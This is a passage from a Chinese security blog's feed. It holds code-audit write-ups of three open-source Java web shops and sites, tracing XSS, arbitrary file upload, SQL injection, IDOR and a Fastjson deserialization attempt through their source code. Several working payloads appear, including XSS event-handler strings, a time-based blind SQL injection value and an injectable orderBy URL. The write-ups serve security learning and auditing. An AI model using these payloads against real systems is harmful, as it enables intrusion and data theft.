-发现最后展示的内容来自<code>requestScope.searchValue</code>。由于该框架有使用SpringMVC，所以需要明确<code>searchValue</code>是从哪里来的。<br>
-这里顺便提一下 SpringMVC 控制器向视图传值的方式有哪些：</p>
-<ul>
-<li>ModelAndView</li>
-<li>ModelMap</li>
-<li>Session</li>
-</ul>
-<p>经过观察，发现此处使用第二种方式传值<br>
-<img src="https://limpid94.github.io/post-images/1629557275826.PNG" alt="" loading="lazy"><br>
-所以通过<code>searchValue</code>定位到<code>src/main/java/com/xq/tmall/controller/fore/ForeProductListController.java</code><br>
-<img src="https://limpid94.github.io/post-images/1629558440397.PNG" alt="" loading="lazy"><br>
-然后往上方查看，发现该值来自<code>product_name</code><br>
-<img src="https://limpid94.github.io/post-images/1629558473062.PNG" alt="" loading="lazy"><br>
-而<code>product_name</code>则直接来自request请求的参数<br>
-<img src="https://limpid94.github.io/post-images/1629558497418.PNG" alt="" loading="lazy"><br>
-可以看到输入即输出，并且在整个源码中没看到web.xml（就离谱！）也没有看到XSS过滤器或处理函数，因此造成反射型xss漏洞。</p>
-<h4 id="存储型xss">存储型XSS</h4>
-<p>同样，在修改个人信息处也存在XSS。现将昵称改为<code>balabala&quot; onmouseover=&quot;alert(1)</code>，保存成功后就能触发。<br>
-<img src="https://limpid94.github.io/post-images/1629559533322.PNG" alt="" loading="lazy"></p>
-<p>与反射型不同，存储型XSS经过存储数据和取出数据并展示两大步骤，因此需要分两大部分来进行追踪。<br>
-<strong>【存储经过】</strong><br>
-通过保存信息的数据包的uri<code>/tmall/user/update</code>定位到对应的controller<code>src/main/java/com/xq/tmall/controller/fore/ForeUserController.java</code>，找到<code>user/update</code>的RequestMapping。<br>
-该部分的源码如下：</p>
-<pre><code class="language-java">    //前台天猫-用户详情更新
-    @RequestMapping(value=&quot;user/update&quot;,method=RequestMethod.POST,produces =&quot;application/json;charset=utf-8&quot;)
-    public String userUpdate(HttpSession session, Map&lt;String,Object&gt; map,
-                             @RequestParam(value = &quot;user_nickname&quot;) String user_nickname  /*用户昵称 */,
-                             @RequestParam(value = &quot;user_realname&quot;) String user_realname  /*真实姓名*/,
-                             @RequestParam(value = &quot;user_gender&quot;) String user_gender  /*用户性别*/,
-                             @RequestParam(value = &quot;user_birthday&quot;) String user_birthday /*用户生日*/,
-                             @RequestParam(value = &quot;user_address&quot;) String user_address  /*用户所在地 */,
-                             @RequestParam(value = &quot;user_profile_picture_src&quot;, required = false)
-                                         String user_profile_picture_src /* 用户头像*/,
-                             @RequestParam(value = &quot;user_password&quot;) String user_password/* 用户密码 */
-    ) throws ParseException, UnsupportedEncodingException {
-        logger.info(&quot;检查用户是否登录&quot;);
-        Object userId = checkUser(session);
-        if (userId != null) {
-            logger.info(&quot;获取用户信息&quot;);
-            User user = userService.get(Integer.parseInt(userId.toString()));
-            map.put(&quot;user&quot;, user);
-        } else {
-            return &quot;redirect:/login&quot;;
-        }
-        logger.info(&quot;创建用户对象&quot;);
-        if (user_profile_picture_src != null &amp;&amp; &quot;&quot;.equals(user_profile_picture_src)) {
-            user_profile_picture_src = null;
-        }
-        User userUpdate = new User()
-                .setUser_id(Integer.parseInt(userId.toString()))
-                .setUser_nickname(user_nickname)
-                .setUser_realname(user_realname)
-                .setUser_gender(Byte.valueOf(user_gender))
-                .setUser_birthday(new SimpleDateFormat(&quot;yyyy-MM-dd&quot;).parse(user_birthday))
-                .setUser_address(new Address().setAddress_areaId(user_address))
-                .setUser_profile_picture_src(user_profile_picture_src)
-                .setUser_password(user_password);
-        logger.info(&quot;执行修改&quot;);
-        if (userService.update(userUpdate)){
-             logger.info(&quot;修改成功!跳转到用户详情页面&quot;);
-             return &quot;redirect:/userDetails&quot;;
-         }
-         throw new RuntimeException();
-    }
-}
-</code></pre>
-<p>该部分浏览下来，就是将用户输入的数据从request中取出并赋值到对应的变量，再调用userService的update方法来执行更新语句。<br>
-而在<code>UserServiceImpl.java</code>同样没有任何过滤。</p>
-<p><strong>【查询并展示经过】</strong><br>
-利用前端页面的<code>填写真实的资料，有助于好友找到你哦。</code>来定位jsp页面，找到<code>src/main/webapp/WEB-INF/page/fore/userDetails.jsp</code>。<br>
-<img src="https://limpid94.github.io/post-images/1629561337925.PNG" alt="" loading="lazy"><br>
-从中得知用户的信息来自<code>requestScope.user</code>。<br>
-找到ForeUserController.java的<code>userDetails</code>，从中看到从session中取出userid并带入数据库中进行查找，将结果返回给user变量并set到map中进行传值。<br>
-<img src="https://limpid94.github.io/post-images/1629561782494.PNG" alt="" loading="lazy"><br>
-该部分也同样没有进行xss的危险函数、字符过滤。因此造成存储型xss漏洞。</p>
-<h3 id="任意文件上传">任意文件上传</h3>
-<p>在用户头像处可以上传用户自定义的图片，但是上传过程中没有对上传的文件和后缀进行校验，导致用户可以上传恶意的代码（webshell）造成服务器权限沦陷。<br>
-<img src="https://limpid94.github.io/post-images/1629562402924.PNG" alt="" loading="lazy"><br>
-<img src="https://limpid94.github.io/post-images/1629562407489.PNG" alt="" loading="lazy"></p>
-<p>从数据包找到接口的代码<br>
-<img src="https://limpid94.github.io/post-images/1629562664530.PNG" alt="" loading="lazy"><br>
-从上方的红框处得知后端取出上传文件的拓展名后与随机值拼接形成新的文件名，再将新文件名与指定的路径拼接，形成完整的保存路径。<br>
-下方的红框则是当文件正确保存在指定路径下则返回success和相对路径。<br>
-整个过程没有黑名单过滤或者白名单限制，因此可以成功上传任意文件。</p>
-<h3 id="sql注入">SQL注入</h3>
-<p>直接全局搜索<code>${</code>，查看是否有开发疏漏的地方。<br>
-<img src="https://limpid94.github.io/post-images/1629564762268.PNG" alt="" loading="lazy"><br>
-选择第一个进入查看</p>
-<pre><code class="language-xml">    &lt;select id=&quot;selectMoreList&quot; resultMap=&quot;productMap&quot;&gt;
-        SELECT
-            product_id,
-            product_name,
-            product_title,
-            product_price,
-            product_sale_price,
-            product_create_date,
-            product_isEnabled,
-            product_category_id,
-            product_sale_count,
-            product_review_count
-        FROM product
-        &lt;where&gt;
-            &lt;if test=&quot;product != null&quot;&gt;
-                &lt;if test=&quot;product.product_price != null&quot;&gt;and product_sale_price &amp;lt;= #{product.product_price}&lt;/if&gt;
-                &lt;if test=&quot;product.product_sale_price != null&quot;&gt;and product_sale_price &amp;gt;=
-                    #{product.product_sale_price}
-                &lt;/if&gt;
-                &lt;if test=&quot;product.product_category != null&quot;&gt;
-                    &lt;if test=&quot;product.product_category.category_id != null&quot;&gt;and product_category_id =
-                        #{product.product_category.category_id}
-                    &lt;/if&gt;
-                &lt;/if&gt;
-            &lt;/if&gt;
-            &lt;if test=&quot;product_name_split != null&quot;&gt;
-                and
-                &lt;foreach collection=&quot;product_name_split&quot; index=&quot;index&quot; item=&quot;item&quot; open=&quot;(&quot; separator=&quot;and&quot; close=&quot;)&quot;&gt;
-                    product_name LIKE concat('%',#{item},'%')
-                &lt;/foreach&gt;
-            &lt;/if&gt;
-            &lt;if test=&quot;product_isEnabled_array != null&quot;&gt;
-                and product_isEnabled IN
-                &lt;foreach collection=&quot;product_isEnabled_array&quot; index=&quot;index&quot; item=&quot;item&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt;
-                    #{item}
-                &lt;/foreach&gt;
-            &lt;/if&gt;
-        &lt;/where&gt;
-        &lt;if test=&quot;orderUtil != null&quot;&gt;
-            ORDER BY ${orderUtil.orderBy}&lt;if test=&quot;orderUtil.isDesc&quot;&gt;desc &lt;/if&gt;
-        &lt;/if&gt;
-        &lt;if test=&quot;pageUtil != null&quot;&gt;
-            LIMIT #{pageUtil.pageStart},#{pageUtil.count}
-        &lt;/if&gt;
-    &lt;/select&gt;
-</code></pre>
-<p><code>ORDER BY</code>后面的内容没有采用<code>#{}</code>，而是从<code>orderUtil.orderBy</code>获得排序条件。在OrderUtil.java中查看具体实现方法<br>
-<img src="https://limpid94.github.io/post-images/1629564951823.PNG" alt="" loading="lazy"><br>
-此时如果有地方调用这两个方法中的一个并且参数可用，则可以造成SQL注入。当然查找的时候有限查找和前台有关的：<br>
-<img src="https://limpid94.github.io/post-images/1629565104406.PNG" alt="" loading="lazy"><br>
-跟进查看<br>
-<img src="https://limpid94.github.io/post-images/1629565177413.PNG" alt="" loading="lazy"><br>
-进一步查看<code>orderUtil</code>的来源<br>
-<img src="https://limpid94.github.io/post-images/1629565255699.PNG" alt="" loading="lazy"><br>
-可以看到<code>orderUtil</code>来自用户可控的<code>orderBy</code>，于是构造url: http://127.0.0.1:8080/tmall/product/6/1?category_id=13&amp;orderBy=product_id，并使用sqlmap进行检测，结果确实是存在时间型盲注。<br>
-<img src="https://limpid94.github.io/post-images/1629565481818.PNG" alt="" loading="lazy"></p>
-<h3 id="rce方面的查找">RCE方面的查找</h3>
-<p>从pom.xml中看到引入的第三方包有：</p>
-<pre><code class="language-xml"> &lt;dependencies&gt;
-    &lt;!-- Database --&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;mysql&lt;/groupId&gt;
-      &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
-      &lt;version&gt;5.1.47&lt;/version&gt;
-    &lt;/dependency&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
-      &lt;artifactId&gt;druid&lt;/artifactId&gt;
-      &lt;version&gt;1.1.19&lt;/version&gt;
-    &lt;/dependency&gt;
-
-    &lt;!-- Json --&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
-      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
-      &lt;version&gt;1.2.58&lt;/version&gt;
-    &lt;/dependency&gt;
-
-    &lt;!-- Jsp compatible--&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
-      &lt;artifactId&gt;jstl&lt;/artifactId&gt;
-    &lt;/dependency&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
-      &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt;
-      &lt;scope&gt;provided&lt;/scope&gt;
-    &lt;/dependency&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;org.apache.taglibs&lt;/groupId&gt;
-      &lt;artifactId&gt;taglibs-standard-impl&lt;/artifactId&gt;
-      &lt;version&gt;1.2.5&lt;/version&gt;
-    &lt;/dependency&gt;
-
-    &lt;!-- Mybatis --&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
-      &lt;artifactId&gt;mybatis&lt;/artifactId&gt;
-      &lt;version&gt;3.5.1&lt;/version&gt;
-    &lt;/dependency&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;
-      &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;
-      &lt;version&gt;2.1.0&lt;/version&gt;
-    &lt;/dependency&gt;
-
-    &lt;!-- Spring --&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
-      &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;
-      &lt;exclusions&gt;
-        &lt;exclusion&gt;
-          &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
-          &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;
-        &lt;/exclusion&gt;
-      &lt;/exclusions&gt;
-    &lt;/dependency&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
-      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
-      &lt;version&gt;2.1.6.RELEASE&lt;/version&gt;
-    &lt;/dependency&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
-      &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;
-      &lt;version&gt;2.1.6.RELEASE&lt;/version&gt;
-    &lt;/dependency&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
-      &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;
-      &lt;version&gt;2.1.6.RELEASE&lt;/version&gt;
-    &lt;/dependency&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
-      &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;
-    &lt;/dependency&gt;
-
-    &lt;!-- log4j2 --&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
-      &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
-      &lt;version&gt;2.10.0&lt;/version&gt;
-    &lt;/dependency&gt;
-    &lt;dependency&gt;
-      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
-      &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
-      &lt;version&gt;2.10.0&lt;/version&gt;
-    &lt;/dependency&gt;
-  &lt;/dependencies&gt;
-</code></pre>
-<p>看到使用了fastjson且版本号为1.2.58，确定存在反序列化的Nday，经过测试可以从dnslog看到查询记录，但是因为缺乏可以使用的第三方类导致最终利用失败</p>
-<p>接下去，逻辑类漏洞本来想写，但是由于它仿站没完成全部内容，遂放弃。</p>
-<h2 id="参考">参考</h2>
-<p>[SpringMVC 控制器向视图传值的方式] https://blog.csdn.net/u011403655/article/details/46336751</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[【Java-WEB】租车系统代码审计]]></title>
-        <id>https://limpid94.github.io/post/java-web-ssh-kuang-jia-zu-che-xi-tong-dai-ma-shen-ji/</id>
-        <link href="https://limpid94.github.io/post/java-web-ssh-kuang-jia-zu-che-xi-tong-dai-ma-shen-ji/">
-        </link>
-        <updated>2021-08-16T09:36:30.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="安装过程">安装过程</h2>
-<p>安装过程按照源码中的说明来即可<br>
-<img src="https://limpid94.github.io/post-images/1629107639331.PNG" alt="" loading="lazy"><br>
-需要修改<code>opencar/src/db.properties</code>中的数据库服务的相关配置：<br>
-然后在Mysql中添加一个新的数据库命名为<code>opencar</code>即可（主要是为了与<code>db.properties</code>一致）</p>
-<p>如果使用Tomcat运行，则需要将源码中的“opencarrun”文件夹整个移入到webapp下，只要数据库配置正确，访问http://127.0.0.1:8080/opencarrun/ 即可运行</p>
-<h2 id="审计经过">审计经过</h2>
-<h3 id="短信炸弹">短信炸弹</h3>
-<p>通过发送短信的数据包发现短信接口<br>
-<img src="https://limpid94.github.io/post-images/1629129979543.PNG" alt="" loading="lazy"><br>
-通过全局搜索关键字<code>getTelCode</code>，在<code>opencar/src/com/weishang/my/action/FrontAction.java</code>找到发送的方法<br>
-<img src="https://limpid94.github.io/post-images/1629130030965.PNG" alt="" loading="lazy"><br>
-从中得知大致流程：通过url的参数将tel参数取出来，然后随机生成4位数的验证码并调用<code>smi.sendMessageInfo</code>将短信发送出去，只要返回成功就返回发送成功的json字符串，并将手机号和随机随机验证码在session中绑定。<br>
-整个流程没有检查发送次数，因此存在短信轰炸。</p>
-<h3 id="xss">XSS</h3>
-<p>登录用户后进到用户的基本资料处，随便挑选一处编辑添加payload<br>
-<img src="https://limpid94.github.io/post-images/1629131332133.PNG" alt="" loading="lazy"><br>
-保存后刷新发现能够触发XSS<br>
-<img src="https://limpid94.github.io/post-images/1629131337809.PNG" alt="" loading="lazy"></p>
-<p>从前端页面找到对应前端的jsp源码<code>opencar/WebRoot/template/default/page/user/userCenter.jsp</code>，有关的用户信息是从<code>ordinary_user</code>取出：<br>
-<img src="https://limpid94.github.io/post-images/1629209830000.PNG" alt="" loading="lazy"><br>
-由于没有使用框架，需要花点功夫查找这个对象是从哪里来的。<br>
-大致浏览一下网站架构，发现有些地方存在重定向的语句：<br>
-<img src="https://limpid94.github.io/post-images/1629210030336.PNG" alt="" loading="lazy"><br>
-于是想到个人信息应该是登录后通过一定方式跳转过来的，因此全局搜索<code>userCenter.jsp</code>看看存在在哪些文件中。<br>
-<img src="https://limpid94.github.io/post-images/1629210306559.PNG" alt="" loading="lazy"><br>
-查看具体的源码，发现这个对象是从session中取出来的。<br>
-<img src="https://limpid94.github.io/post-images/1629210377987.PNG" alt="" loading="lazy"><br>
-熟悉网站开发的通信学可以想到session中的数据应该是在登录成功的时候被设置的。但是这个不是我们需要继续关心的。现在知道<code>ordinary_user</code>的来源后，要关心更新个人信息的相关流程。<br>
-从保存按钮调用的js函数可以看到，其发送到接口<code>&lt;%=basePath%&gt;wx/wxUpdateUserInfo</code><br>
-<img src="https://limpid94.github.io/post-images/1629211995409.PNG" alt="" loading="lazy"><br>
-全局查找该接口，在<code>opencar/src/com/weishang/my/action/user/WxUpdateUserInfo.java</code>中找到<br>
-<img src="https://limpid94.github.io/post-images/1629212051076.PNG" alt="" loading="lazy"><br>
-从中看到除了tel参数有做长度的限制之外，其余的均从request实例中直接获取并保存。<br>
-<img src="https://limpid94.github.io/post-images/1629212284655.PNG" alt="" loading="lazy"><br>
-在web.xml中也没有看到针对XSS的filter，于是造成了存储型的xss漏洞。<br>
-其余的地方亦相似，就不一一例举。</p>
-<h3 id="越权删除他人账户地址">越权删除他人账户地址</h3>
-<p>在收获地址处可以看到用户的个人地址，虽然此处无法越权查看他人的收货地址，但是可以越权删除。<br>
-在点击删除按钮后，数据包的接口地址为<code>wx/wxDeleteAddress</code>，因此查找相关地址，并在其中找到处理的流程：<br>
-<img src="https://limpid94.github.io/post-images/1629214352415.PNG" alt="" loading="lazy"><br>
-在红框处的流程为从request对象中取出<code>address_id</code>后直接带入数据库执行，并没有核对是否属于当前用户。因此可能存在越权删除的漏洞。<br>
-为了进一步验证漏洞，我设置两个账号test1和test2，其地址分别如下<br>
-<img src="https://limpid94.github.io/post-images/1629214465512.PNG" alt="" loading="lazy"><br>
-<img src="https://limpid94.github.io/post-images/1629214471950.PNG" alt="" loading="lazy"><br>
-在数据库中对应的id为：<br>
-<img src="https://limpid94.github.io/post-images/1629214482333.PNG" alt="" loading="lazy"><br>
-现在用test1的账户（对应地址为701）对test2的id为702的地址进行删除<br>
-<img src="https://limpid94.github.io/post-images/1629214566538.PNG" alt="" loading="lazy"><br>
-返回删除成功，此时test2的账户中已经找不到收货地址<br>
-<img src="https://limpid94.github.io/post-images/1629214629859.PNG" alt="" loading="lazy"><br>
-当然还有越权查看他人订单，这里就不详细说明了。</p>
-<h3 id="sql注入">SQL注入</h3>
-<p>本源码中与数据库进行交互的地方大量使用了预编译技术，但是由于开发的原因还是不少地方存在变量拼接之处。同时在京东的一篇技术文章也指出在<code>like</code>、<code>in</code>、 <code>order by</code>部分使用预编译技术会产生报错<br>
-<img src="https://limpid94.github.io/post-images/1629265710412.PNG" alt="" loading="lazy"></p>
-<p>从本源码的service部分进行查找，发现了不少的变量拼接。这里以<code>getGoodsPojoListByTypeAndcatAndBranAndPrice</code>为例。<br>
-从ShopService.java中看到getGoodsPojoListByTypeAndcatAndBranAndPrice的实现过程<br>
-<img src="https://limpid94.github.io/post-images/1629265901055.PNG" alt="" loading="lazy"><br>
-这里<code>cat_ids</code>、<code>type_ids</code>、<code>brand_ids</code>、<code>price</code>、<code>order</code>均为string类型，存在输入恶意SQL语句的可能性（查找的过程中直接排除Interger类型，因为JAVA为强类型语言。）<br>
-此处在<code>in</code>后存在变量拼接。紧接着查找调用该方法的地方。<br>
-<img src="https://limpid94.github.io/post-images/1629266094971.PNG" alt="" loading="lazy"><br>
-双击后来到GoodList.java，在里面找到具体的调用过程：<br>
-<img src="https://limpid94.github.io/post-images/1629266163981.PNG" alt="" loading="lazy"><br>
-这里的参数没有经过过滤，直接从requests对象中取出并带入到SQL语句中查询。这样做确实存在SQL注入漏洞。现在需要查找流程从哪里进入到此处。<br>
-在第23行有<code>@WebServlet(displayName=&quot;跳转到信访页面&quot;,name=&quot;GoodsList&quot;,urlPatterns=&quot;/goods&quot;)</code>说明访问的地址是<code>baseurl+/goods</code>，但是查找的时候并没有找到。后来经过长时间的查找，发现跳转的细节是<code>response.sendRedirect(basePath+&quot;goods?cat_id=&quot;+type_id+&quot;&amp;menuId=7&quot;);</code>，于是跟进到FrontAction.java，<br>
-<img src="https://limpid94.github.io/post-images/1629266485172.PNG" alt="" loading="lazy"><br>
-于是构造<code>cat_id</code>的值为<code>1) and if(ascii(substr(user(),1,1))&gt;50,sleep(2),1) -- -</code>，当正确时经过一段时间的延迟后返回<br>
-<img src="https://limpid94.github.io/post-images/1629267571003.PNG" alt="" loading="lazy"><br>
-当错误时直接返回<br>
-<img src="https://limpid94.github.io/post-images/1629267608278.PNG" alt="" loading="lazy"><br>
-后续就不再继续。<br>
-其他的注入点类似，遂不一一分析。</p>
-<h3 id="备注">备注</h3>
-<p>本源码还有一处漏洞在于支付流程可以0元购，但是搭建起来后在支付环节一直报错，弄了很久也没办法修复，遂放弃调试。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[【Java-WEB】酷因教育网站代码审计]]></title>
-        <id>https://limpid94.github.io/post/java-web-ku-yin-jiao-yu-wang-zhan-dai-ma-shen-ji/</id>
-        <link href="https://limpid94.github.io/post/java-web-ku-yin-jiao-yu-wang-zhan-dai-ma-shen-ji/">
-        </link>
-        <updated>2021-08-11T17:27:02.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="源码搭建">源码搭建</h2>
-<p>使用IDEA打开源码，首先修改pom.xml的几处地方<br>
-<img src="https://limpid94.github.io/post-images/1629042015880.PNG" alt="" loading="lazy"><br>
-接着修改project.properties的配置<br>
-<img src="https://limpid94.github.io/post-images/1629042035467.PNG" alt="" loading="lazy"><br>
-随后配置运行环境<br>
-<img src="https://limpid94.github.io/post-images/1629042048903.PNG" alt="" loading="lazy"><br>
-最后导入sql文件到mysql中即可。</p>
-<h2 id="审计经过">审计经过</h2>
-<h3 id="反射型xss漏洞">反射型XSS漏洞</h3>
-<h4 id="黑盒测试情况">黑盒测试情况：</h4>
-<p>直接在搜索框输入<code>&quot;&gt;&lt;img+src=&quot;x&quot;+onerror=&quot;alert(/xxx/)</code>，则在相应包中原样输出，未经过滤，直接触发XSS弹窗。<br>
-<img src="https://limpid94.github.io/post-images/1629001212130.PNG" alt="" loading="lazy"></p>
-<h4 id="白盒审计情况">白盒审计情况</h4>
-<p>先看web.xml的filter配置情况。<br>
-<img src="https://limpid94.github.io/post-images/1629001508283.PNG" alt="" loading="lazy"><br>
-从中未发现有XSS的相关过滤项。于是从相应包的XSS的位置找到对应的前端<code>header.jsp</code>，发现搜索框的具体内容是用EL表达式进行取值。<br>
-<img src="https://limpid94.github.io/post-images/1629001897658.PNG" alt="" loading="lazy"><br>
-于是从entity中找到具体的内容<br>
-<img src="https://limpid94.github.io/post-images/1629001888577.PNG" alt="" loading="lazy"><br>
-而该值是从数据库中查询的：<br>
-<img src="https://limpid94.github.io/post-images/1629002287672.PNG" alt="" loading="lazy"><br>
-<img src="https://limpid94.github.io/post-images/1629002312744.PNG" alt="" loading="lazy"><br>
-到目前的反向追溯都没有发现有转义或者过滤。再到controller层进行查看<br>
-<img src="https://limpid94.github.io/post-images/1629002483122.PNG" alt="" loading="lazy"><br>
-浏览下来也没有对XSS进行处理，因此最后会将危险的XSSpayload原样输出。</p>
-<h3 id="sql注入前台和后台">SQL注入（前台和后台）</h3>
-<p>首先全局搜索<code>${</code>，因为使用<code>${}</code>进行数据库查询是不经过预编译的，因此可能存在SQL注入<br>
-<img src="https://limpid94.github.io/post-images/1628921420323.PNG" alt="" loading="lazy"><br>
-数量还是比较多，任选一处入手好了。<br>
-<img src="https://limpid94.github.io/post-images/1628921575493.PNG" alt="" loading="lazy"><br>
-看到此处的对应的方法为<code>delMsgSystemById</code>，查看dao中相应的接口：<br>
-<img src="https://limpid94.github.io/post-images/1628923025919.PNG" alt="" loading="lazy"><br>
-再看service相关的代码是如何实现的。具体的代码在<code>MsgSystemServiceImpl.java</code>中<br>
-<img src="https://limpid94.github.io/post-images/1628923498595.PNG" alt="" loading="lazy"><br>
-通过其对应到的<code>AdminMsgSystemController.java</code>的源码可以看到对应的接口名称和传入参数<br>
-<img src="https://limpid94.github.io/post-images/1628923677426.PNG" alt="" loading="lazy"><br>
-通过对逻辑代码的审查，看到如果查询成功就显示json字符串的</p>
-<pre><code class="language-json">{&quot;success&quot;:true,&quot;message&quot;:&quot;操作成功！&quot;,&quot;entity&quot;:null}
-</code></pre>
-<p>否则显示</p>
-<pre><code class="language-json">{&quot;success&quot;:true,&quot;message&quot;:&quot;系统繁忙,请稍后再试！&quot;,&quot;entity&quot;:null}
-</code></pre>
-<p>由此推断该注入类型为盲注。<br>
-但由于是在后台，所以需要先用管理员账号登录后再尝试访问接口。<br>
-<img src="https://limpid94.github.io/post-images/1628923908100.PNG" alt="" loading="lazy"><br>
-通过后台的debug日志，发现确实带入了我们的“恶意”语句<br>
-<img src="https://limpid94.github.io/post-images/1628923993785.PNG" alt="" loading="lazy"><br>
-此处以查询当前user()的首位字符为例，当ascii码大于113的时候执行了sleep(3)，大于114时直接返回。<br>
-<img src="https://limpid94.github.io/post-images/1628924643788.PNG" alt="" loading="lazy"><br>
-<img src="https://limpid94.github.io/post-images/1628924652053.PNG" alt="" loading="lazy"><br>
-由此现象可以说明当前user()的首位字符的ascii码为114，转成字符为<code>r</code><br>
-当然，此处要利用还是比较鸡肋的，继续看看是否存在前端的SQL注入。<br>
-继续查找，发现<code>CourseFavoritesMapper.xml</code>中存在SQL注入的“标志”<br>
-<img src="https://limpid94.github.io/post-images/1628925616258.PNG" alt="" loading="lazy"><br>
-通过id去dao中查找对应的接口情况：<br>
-<img src="https://limpid94.github.io/post-images/1628925723642.PNG" alt="" loading="lazy"><br>
-又找到对应的serviceImpl<br>
-<img src="https://limpid94.github.io/post-images/1628925779369.PNG" alt="" loading="lazy"><br>
-最后定位到Controller<br>
-<img src="https://limpid94.github.io/post-images/1628925802781.PNG" alt="" loading="lazy"><br>
-看到对应的url是<code>/deleteFaveorite/{ids}</code>，当然直接这样访问是不对的，因为在这个controller一开始的地方多了个<code>RequestMapping</code>注解<br>
-<img src="https://limpid94.github.io/post-images/1628925796096.PNG" alt="" loading="lazy"><br>
-因此正确的接口是<code>/uc/deleteFaveorite/{ids}</code><br>
-尝试访问<code>/uc/deleteFaveorite/29'</code>发现报错<br>
-<img src="https://limpid94.github.io/post-images/1628928733737.PNG" alt="" loading="lazy"><br>
-从后台的日志可以看到报错，并且查询语句确实传入我们的单引号。<br>
-<img src="https://limpid94.github.io/post-images/1628928752438.PNG" alt="" loading="lazy"><br>
-使用sqlmap进行测试，结果存在注入。<br>
-<img src="https://limpid94.github.io/post-images/1628929004341.PNG" alt="" loading="lazy"><br>
-其余的注入点不再一一测试。</p>
-<h3 id="越权">越权</h3>
-<p>为了测试，注册两个普通用户123@qq.com和111@q.com。id分别为68和69。<br>
-现在登录id为69的账户，修改名称为张三后提交并拦截数据包：<br>
-<img src="https://limpid94.github.io/post-images/1628931594712.PNG" alt="" loading="lazy"></p>
-<p><img src="https://limpid94.github.io/post-images/1628931671504.PNG" alt="" loading="lazy"><br>
-发送后登录id为68的账号查看情况<br>
-<img src="https://limpid94.github.io/post-images/1628931748620.PNG" alt="" loading="lazy"><br>
-为了究其原因，需要从代码层面入手。<br>
-首先到controller中找到对应的逻辑代码。<br>
-<img src="https://limpid94.github.io/post-images/1628931856524.PNG" alt="" loading="lazy"><br>
-可以看到直接把传入的POST参数实例化成User类的实例并对应赋值后带入数据库执行。再UserServiceImpl.java中第95行看到直接执行dao的updateUser方法。<br>
-<img src="https://limpid94.github.io/post-images/1628931991994.PNG" alt="" loading="lazy"><br>
-在对应的mapper中找到更新语句：<br>
-<img src="https://limpid94.github.io/post-images/1628932076937.PNG" alt="" loading="lazy"><br>
-由此可见整个流程并没有对用户身份进行校验，导致用户可以修改任意账号的信息。<br>
-进一步思考：能否改到admin账号呢？<br>
-从UserMapper.xml中看到，update的语句是执行的表明是EDU_USER，而admin是在SYS_USER中，因此不可以修改admin账号的任何信息。</p>
-<h3 id="任意文件上传">任意文件上传</h3>
-<p>在前台用户的头像上传功能上传头像时可以指定上传类型并上传恶意代码，从而获取服务器权限。<br>
-在测试上传文件时发现fileType参数是允许的类型，如果filename的后缀在fileType所指定的范围内，则可以上传成功（但是经过测试，jsp后缀不可以）<br>
-<img src="https://limpid94.github.io/post-images/1628956875828.PNG" alt="" loading="lazy"><br>
-<img src="https://limpid94.github.io/post-images/1628956902279.PNG" alt="" loading="lazy"></p>
-<p>原想向从上传的数据包来定位controller，发现没有相关的路径，但是找到在<code>src/main/java/com/inxedu/os/common/controller/VideoUploadController.java</code>中有<code>gok4</code>方法，仔细观察和我们上传图片的数据包中的参数均相同<br>
-<img src="https://limpid94.github.io/post-images/1628961316862.PNG" alt="" loading="lazy"><br>
-从流程中看出，后台会将上传文件的后缀名称是否包含在上传的fileType的值中，若有则进行落地，否则报错。但是这整个过程并没有对后缀进行黑名单检查或者白名单限制。因此可以上传jspx后缀的文件。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Fastjson反序列化学习笔记（一）]]></title>
-        <id>https://limpid94.github.io/post/fastjson-fan-xu-lie-hua-xue-xi-bi-ji-yi-chu-shi-lou-dong/</id>
-        <link href="https://limpid94.github.io/post/fastjson-fan-xu-lie-hua-xue-xi-bi-ji-yi-chu-shi-lou-dong/">
-        </link>
-        <updated>2021-08-02T17:20:18.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="什么是fastjson">什么是Fastjson</h2>
-<blockquote>
